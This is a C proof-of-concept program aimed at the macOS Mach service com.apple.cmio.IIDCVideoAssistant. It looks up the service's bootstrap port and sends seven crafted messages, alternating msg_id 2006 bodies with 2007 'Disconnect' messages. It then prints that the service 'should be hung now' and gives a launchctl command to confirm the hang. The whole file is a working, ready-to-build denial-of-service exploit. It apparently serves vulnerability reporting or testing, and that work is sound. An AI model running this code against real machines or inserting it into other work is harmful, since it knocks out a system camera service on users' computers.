// PoC for com.apple.cmio.IIDCVideoAssistant hang
// Extracted from iidc_poc_hang.log - only msg_id 2006 and 2007
// Build: clang -o iidc_poc_hang iidc_poc_hang.c
// Run:   ./iidc_poc_hang

#include <mach/mach.h>
#include <servers/bootstrap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

typedef struct {
	mach_msg_header_t header;
	uint8_t body[24];
} iidc_message_t;

static kern_return_t send_message(mach_port_t service_port, int msg_id, 
                                   uint32_t msg_size, const uint8_t *body, 
                                   uint32_t body_size, int msg_num) {
	iidc_message_t msg;
	kern_return_t kr;

	memset(&msg, 0, sizeof(msg));
	msg.header.msgh_bits = 0x13; // MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0)
	msg.header.msgh_size = msg_size;
	msg.header.msgh_remote_port = service_port;
	msg.header.msgh_local_port = MACH_PORT_NULL;
	msg.header.msgh_voucher_port = MACH_PORT_NULL;
	msg.header.msgh_id = msg_id;

	if (body && body_size > 0) {
		memcpy(msg.body, body, body_size);
	}

	printf("[%d] Sending msg_id=%d, size=%d\n", msg_num, msg_id, msg_size);

	kr = mach_msg(
		&msg.header,
		MACH_SEND_MSG,
		msg.header.msgh_size,
		0,
		MACH_PORT_NULL,
		MACH_MSG_TIMEOUT_NONE,
		MACH_PORT_NULL
	);

	if (kr != KERN_SUCCESS) {
		printf("[%d] Failed: %s (0x%x)\n", msg_num, mach_error_string(kr), kr);
	} else {
		printf("[%d] Success\n", msg_num);
	}

	return kr;
}

int main(void) {
	kern_return_t kr;
	mach_port_t bootstrap_port;
	mach_port_t service_port;

	kr = task_get_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, &bootstrap_port);
	if (kr != KERN_SUCCESS) {
		printf("Failed to get bootstrap port: %s\n", mach_error_string(kr));
		return 1;
	}

	kr = bootstrap_look_up(bootstrap_port, "com.apple.cmio.IIDCVideoAssistant", &service_port);
	if (kr != KERN_SUCCESS) {
		printf("Failed to look up service: %s\n", mach_error_string(kr));
		return 1;
	}
	printf("Got service port: 0x%x\n\n", service_port);

	// Message 1: msg_id=2006, size=36, body=12 bytes
	{
		uint8_t body[] = {
			0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00,
			0x00, 0x3a, 0x00, 0x00
		};
		send_message(service_port, 2006, 36, body, sizeof(body), 1);
	}

	// Message 2: msg_id=2007, size=24, body=0 bytes (Disconnect)
	{
		send_message(service_port, 2007, 24, NULL, 0, 2);
	}

	// Message 3: msg_id=2006, size=36, body=12 bytes
	{
		uint8_t body[] = {
			0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00,
			0x00, 0x50, 0x69, 0x0f
		};
		send_message(service_port, 2006, 36, body, sizeof(body), 3);
	}

	// Message 4: msg_id=2006, size=36, body=12 bytes
	{
		uint8_t body[] = {
			0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x47
		};
		send_message(service_port, 2006, 36, body, sizeof(body), 4);
	}

	// Message 5: msg_id=2006, size=36, body=12 bytes
	{
		uint8_t body[] = {
			0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00
		};
		send_message(service_port, 2006, 36, body, sizeof(body), 5);
	}

	// Message 6: msg_id=2007, size=24, body=0 bytes (Disconnect)
	{
		send_message(service_port, 2007, 24, NULL, 0, 6);
	}

	// Message 7: msg_id=2006, size=36, body=12 bytes
	{
		uint8_t body[] = {
			0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x50
		};
		send_message(service_port, 2006, 36, body, sizeof(body), 7);
	}

	printf("\nAll messages sent. Service should be hung now.\n");
	printf("Verify with: sudo launchctl list | grep IIDC\n");

	return 0;
}
